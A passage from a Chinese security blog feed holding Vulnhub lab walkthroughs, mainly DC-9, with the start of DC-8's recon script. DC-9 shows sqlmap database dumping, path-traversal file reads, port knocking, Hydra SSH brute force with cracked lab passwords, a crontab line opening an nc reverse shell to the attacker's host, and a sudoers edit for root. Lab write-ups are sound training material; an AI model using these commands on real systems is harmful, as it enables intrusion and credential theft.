class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kali 用nc监听一下8888端口,等一会就会反弹一个shell了<br><img src="/../static/chanakya/image-20200519233832895.png" alt="image-20200519233832895"></p></li><li><p>看了下计划任务<br><img src="/../static/chanakya/image-20200519234002162.png" alt="image-20200519234002162"></p></li><li><p>一分钟就会执行一次<em><strong>chkrootkit</strong></em> </p></li><li><p>到这里就结束了</p></li></ul><h2 id="3-重要信息"><a href="#3-重要信息" class="headerlink" title="3. 重要信息"></a>3. 重要信息</h2><h3 id="3-1-FTP账号密码"><a href="#3-1-FTP账号密码" class="headerlink" title="3.1 FTP账号密码"></a>3.1 FTP账号密码</h3><p>​<em><strong>ashoka : kautilya</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-9靶机渗透</title>
      <link href="/dc-9/"/>
      <url>/dc-9/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-9靶机渗透"><a href="#DC-9靶机渗透" class="headerlink" title="DC-9靶机渗透"></a>DC-9靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>初期脚本扫描</p></li><li><p>扫描结果</p></li></ul><p><img src="/../static/dc-9/image-20200505133218228.png" alt="image-20200505133218228"></p><ul><li><p>可以发现 ip地址为：<code>192.168.0.114</code> ssh (但是ssh无法访问了) 和 http服务s</p></li><li><p>但是没有其他可用的信息 </p></li><li><p>爆破一下目录</p></li><li><p>我这里用御剑爆破</p></li><li><p>输入url： <a href="http://192.168.0.114/">http://192.168.0.114</a></p></li></ul><p><img src="/../static/dc-9/image-20200505135003390.png" alt="image-20200505135003390"></p><ul><li><p>访问 <a href="http://192.168.0.114/index.php">http://192.168.0.114/index.php</a> 是一个员工信息的主页</p></li><li><p>search.php 有一个搜索框。admin.php。是一个登陆界面</p></li><li><p>逐个fuzzing一下Sql注入</p></li></ul><p><img src="/../static/dc-9/image-20200505133904515.png" alt="image-20200505133904515"></p><ul><li><p>可以发现存在sql注入</p></li><li><p>那就直接列表名</p></li></ul><p><img src="/../static/dc-9/image-20200505134248401.png" alt="image-20200505134248401"></p><ul><li>列出User表的字段</li></ul><p><img src="/../static/dc-9/image-20200505134512164.png" alt="image-20200505134512164"></p><ul><li>列出UserID，Username，Password字段的数据</li></ul><p><img src="/../static/dc-9/image-20200505134659369.png" alt="image-20200505134659369"></p><ul><li>得到账号密码：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">admin <span class="token string">'856f5de590ef37314e7c3bdf6f8a66dc'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>密码是MD5的拿去破解一下</li></ul><p><img src="/../static/dc-9/image-20200505134842141.png" alt="image-20200505134842141"></p><ul><li><p>得到真正的账号密码 <code>admin : transorbital1</code></p></li><li><p>再用sqlmap跑跑其他数据库</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://192.168.146.147/results.php <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"search=1"</span> <span class="token parameter variable">--dbms</span> mysql <span class="token parameter variable">--dbs</span>  //information_schema，Staff，还有一个新表userssqlmap <span class="token parameter variable">-u</span> http://192.168.146.147/results.php <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"search=1"</span> <span class="token parameter variable">--dbms</span> mysql <span class="token parameter variable">-D</span> <span class="token function">users</span> <span class="token parameter variable">-tables</span>    //UserDetailssqlmap <span class="token parameter variable">-u</span> http://192.168.146.147/results.php <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"search=1"</span> <span class="token parameter variable">--dbms</span> mysql <span class="token parameter variable">-D</span> <span class="token function">users</span> <span class="token parameter variable">-T</span> UserDetails <span class="token parameter variable">--columns</span> //firstname,id,lastname,password,reg_date,usernamesqlmap <span class="token parameter variable">-u</span> http://192.168.146.147/results.php <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"search=1"</span> <span class="token parameter variable">--dbms</span> mysql <span class="token parameter variable">-D</span> <span class="token function">users</span> <span class="token parameter variable">-T</span> UserDetails <span class="token parameter variable">-C</span> id,firstname,lastname,password <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>得到一堆密码</li></ul><p><img src="/../static/dc-9/image-20200505154932928.png" alt="image-20200505154932928"></p><ul><li><p>先把他放到字典里，等下用来爆破用</p></li><li><p>登陆之后再welcome.php的下面看到<code>File does not exist</code></p></li><li><p>可能有LFI</p></li><li><p>使用<code>burpsuite</code>进行FUZZ</p></li><li><p>可以看到<code>/etc/passwd</code></p></li><li><p>提取用户名：</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">marymjuliedfredfbarneyrtomcjerrymwilmafbettyrchandlerbjoeytrachelgrossgmonicagphoebebscootsjanitor2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>本想用包含访问日志的，但是并不能包含访问日志，只能试试爆破SSH,但是SSH被过滤了</p></li><li><p>最后百度一大堆…</p></li><li><p>终于<a href="https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html">https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html</a></p></li><li><p>知道<code>/etc/knockd.conf</code>也许能解开22端口</p></li><li><p>在<a href="http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf">http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf</a></p></li></ul><p><img src="/../static/dc-9/image-20200505154709439.png" alt="image-20200505154709439"></p><ul><li><p>得到ssh防御策略</p></li><li><p>意思是依次访问 7469,8475,9842端口就能解开22端口</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">192.168</span>.0.114 <span class="token number">7469</span><span class="token function">nc</span> <span class="token number">192.168</span>.0.114 <span class="token number">8475</span><span class="token function">nc</span> <span class="token number">192.168</span>.0.114 <span class="token number">9842</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>然后再用 <code>Hydra</code>爆破ssh</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> result.txt <span class="token parameter variable">-t</span> <span class="token number">4</span> ssh://192.168.0.114<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>得到3个用户名密码</p></li><li><p><img src="/../static/dc-9/image-20200505155536834.png" alt="image-20200505155536834"></p></li><li><p>登录进去看看呗</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> chandlerb@192.168.0.114   <span class="token operator">>></span> UrAG0D<span class="token operator">!</span><span class="token function">ssh</span> joeyt@192.168.0.114<span class="token operator">>></span> Passw0rd<span class="token function">ssh</span> janitor@192.168.0.114<span class="token operator">>></span> Ilovepeepee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>都看了看，发现只有 <code>janitor</code>用户下有个有用的东西</li></ul><p><img src="/../static/dc-9/image-20200505154228962.png" alt="image-20200505154228962"></p><ul><li>这里又有几个密码，做成字典爆破其他用户</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> pwd.txt <span class="token parameter variable">-t</span> <span class="token number">6</span> ssh://192.168.0.114<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../static/dc-9/image-20200505160203999.png" alt="image-20200505160203999"></p><ul><li>然后我们登录<code>fredf</code>用户</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> fredf@192.168.0.114<span class="token operator">>></span> B4-Tru3-001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../static/dc-9/image-20200505160402623.png" alt="image-20200505160402623"></p><ul><li><p>发现 <code>/opt/devstuff/dist/test/test</code> 可以不用root密码执行</p></li><li><p>发现这是一个python打包好的程序</p></li><li><p>python文件在<code>/opt/devstuff/test.py</code></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">fredf@dc<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">/</span>opt<span class="token operator">/</span>devstuff$ cat test<span class="token punctuation">.</span>py<span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Usage: python test.py read append"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>        output <span class="token operator">=</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>output<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>读取第一个参数的文件添加到第二个文件的里面</p></li><li><p>可以利用计划任务来反弹shell</p></li><li><p>先看看计划任务</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fredf@dc-9:/opt/devstuff/dist$ <span class="token function">cat</span> /etc/crontab<span class="token comment"># /etc/crontab: system-wide crontab</span><span class="token comment"># Unlike any other crontab you don't have to run the `crontab'</span><span class="token comment"># command to install the new version when you edit this file</span><span class="token comment"># and files in /etc/cron.d. These files also have username fields,</span><span class="token comment"># that none of the other crontabs do.</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<span class="token comment"># Example of job definition:</span><span class="token comment"># .---------------- minute (0 - 59)</span><span class="token comment"># |  .------------- hour (0 - 23)</span><span class="token comment"># |  |  .---------- day of month (1 - 31)</span><span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><span class="token comment"># |  |  |  |  |</span><span class="token comment"># *  *  *  *  * user-name command to be executed</span><span class="token number">17</span> *    * * * root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.hourly<span class="token number">25</span> <span class="token number">6</span>    * * * root      <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.daily <span class="token punctuation">)</span><span class="token number">47</span> <span class="token number">6</span>    * * <span class="token number">7</span> root      <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.weekly <span class="token punctuation">)</span><span class="token number">52</span> <span class="token number">6</span>    <span class="token number">1</span> * * root      <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.monthly <span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>先在&#x2F;tmp目录下写上</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'*/1 * * * * root nc -e /bin/bash 192.168.0.21 8899'</span> <span class="token operator">></span> /tmp/crontab-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../static/dc-9/image-20200505161858371.png" alt="image-20200505161858371"></p><ul><li><p>然后kali监听好，等一小会就能得到root权限了</p></li><li><p>等了半天发现没反应~，原来是没有nc</p></li><li><p>那就通过<code>/etc/sudoers</code>文件来给当前用户root权限</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'fredf    ALL=(ALL:ALL) ALL'</span> <span class="token operator">></span> /tmp/sudo-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../static/dc-9/image-20200505162742825.png" alt="image-20200505162742825"></p><p><img src="/../static/dc-9/image-20200505162841981.png" alt="image-20200505162841981"></p><ul><li>就完成了~~~~</li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-8靶机渗透</title>
      <link href="/dc-8/"/>
      <url>/dc-8/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-8靶机渗透"><a href="#DC-8靶机渗透" class="headerlink" title="DC-8靶机渗透"></a>DC-8靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li>今天我们用一个脚本来做前期的扫描</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> commands <span class="token keyword">as</span> cmd<span class="token keyword">import</span> threading<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> recolor <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'black'</span> <span class="token punctuation">:</span>   <span class="token string">'\033[30m'</span><span class="token punctuation">,</span>    <span class="token string">'red'</span>   <span class="token punctuation">:</span>   <span class="token string">'\033[31m'</span><span class="token punctuation">,</span>    <span class="token string">'green'</span> <span class="token punctuation">:</span>   <span class="token string">'\033[32m'</span><span class="token punctuation">,</span>    <span class="token string">'yellow'</span><span class="token punctuation">:</span>   <span class="token string">'\033[33m'</span><span class="token punctuation">,</span>    <span class="token string">'blue'</span>  <span class="token punctuation">:</span>   <span class="token string">'\033[34m'</span><span class="token punctuation">,</span>    <span class="token string">'purple'</span><span class="token punctuation">:</span>   <span class="token string">'\033[35m'</span><span class="token punctuation">,</span>    <span class="token string">'suffix'</span><span class="token punctuation">:</span>   <span class="token string">'\033[0m'</span><span class="token punctuation">&#125;</span>result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">add_color</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> c <span class="token keyword">in</span> color<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> color<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">+</span> s <span class="token operator">+</span> color<span class="token punctuation">[</span><span class="token string">'suffix'</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">check_adder</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    compile_ip <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>        <span class="token string">r'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> compile_ip<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> addr    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">scan_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> cmd<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">"arp-scan --interface eth0 192.168.0.0/24 | grep VMware | awk '&#123;print $1&#125;'"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_adders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    adders <span class="token operator">=</span> scan_addr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>adders<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> addr <span class="token keyword">in</span> adders<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[*] IP address found:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[!] No IP address found!'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        input_addr <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please enter the IP address manually. Multiple IP addresses are separated by ","'</span><span class="token punctuation">)</span>        adders <span class="token operator">=</span> <span class="token punctuation">[</span>check_adder<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token keyword">for</span> addr <span class="token keyword">in</span> input_addr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> adders<span class="token keyword">def</span> <span class="token function">scan_port</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> check_adder<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[*] Start scanning port of &#123;&#125; ...'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'nmap'</span><span class="token punctuation">]</span> <span class="token operator">=</span> cmd<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">"nmap -sS -A -p- &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">nikto_scan</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[*] Start scanning Web Services of &#123;&#125;...'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> cmd<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">"nikto -host &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    errors <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'No web server found'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>errors<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[!] An error was encountered while scanning the Host:&#123;&#125;:80.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        host <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please enter the correct URL:\n'</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> cmd<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">"nikto -host &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'nikto'</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token keyword">def</span> <span class="token function">whatweb_scan</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[*] Start scanning Web information of &#123;&#125;...'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    cs <span class="token operator">=</span> cmd<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">"whatweb &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    _r <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\033\[\d&#123;1,2&#125;m'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> cs<span class="token punctuation">)</span>    res <span class="token operator">=</span> _r<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    ls <span class="token operator">=</span> <span class="token punctuation">[</span>res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">del</span> res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">del</span> res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">del</span> res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ls<span class="token punctuation">)</span><span class="token punctuation">)</span>    result<span class="token punctuation">[</span><span class="token string">'whatweb'</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token comment"># 写入输出结果</span><span class="token keyword">def</span> <span class="token function">write_result</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    ld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>>>'</span><span class="token punctuation">,</span> <span class="token string">'Language'</span><span class="token punctuation">,</span> <span class="token string">'Country'</span><span class="token punctuation">,</span> <span class="token string">'Framework'</span><span class="token punctuation">,</span> <span class="token string">'Server'</span><span class="token punctuation">,</span> <span class="token string">'IP'</span><span class="token punctuation">,</span> <span class="token string">'JsFWK'</span><span class="token punctuation">,</span><span class="token string">'MetaGenerator'</span><span class="token punctuation">,</span> <span class="token string">'ScriptType'</span><span class="token punctuation">,</span> <span class="token string">'Title'</span><span class="token punctuation">,</span><span class="token string">'XFO'</span><span class="token punctuation">,</span> <span class="token string">'UH'</span><span class="token punctuation">]</span>    threads <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>scan_port<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>nikto_scan<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>whatweb_scan<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span> t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span> t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    style <span class="token operator">=</span> <span class="token string">'style="background-color:#000;color:#0F0;width:96%;padding:2%;border:2px double #2F2;"'</span>    html <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""&lt;!DOCTYPE html>    &lt;html style="background-color:#000; color:#FFF;">    &lt;head>      &lt;title>Auto-Scan&lt;/title>      &lt;meta charset="utf-8"/>    &lt;/head>    &lt;body style="font-size:120%;">     &lt;center> &lt;h1>Auto-Scan Report - [&#123;ip&#125;]&lt;/h1>&lt;/center>     &lt;center>&lt;h3>Scan-Port&lt;/h3>&lt;/center>     &lt;pre &#123;sy&#125;>&#123;sp&#125;&lt;/pre>     &lt;center>&lt;h3>Scan-WebServer&lt;/h3>&lt;/center>     &lt;pre &#123;sy&#125;>&#123;sw&#125;&lt;/pre>     &lt;center>&lt;h3>Scan-WebServer&lt;/h3>&lt;/center>     &lt;pre &#123;sy&#125;>&lt;table>        &lt;tbody>            &#123;sww&#125;        &lt;/tbody>     &lt;/table>&lt;/pre>     &lt;center> All Rights Reserved &amp;copy; &lt;strong>Auto-Scan&lt;/strong>&lt;/center>    &lt;/body>    &lt;/html>"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token operator">=</span>addr<span class="token punctuation">,</span>                      sy<span class="token operator">=</span>style<span class="token punctuation">,</span>                      sp<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token string">'nmap'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      sw<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token string">'nikto'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      sww<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;tr>&lt;td>&#123;&#125;&lt;/td>&lt;td>&#123;&#125;&lt;/td>&lt;/tr>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ld<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> result<span class="token 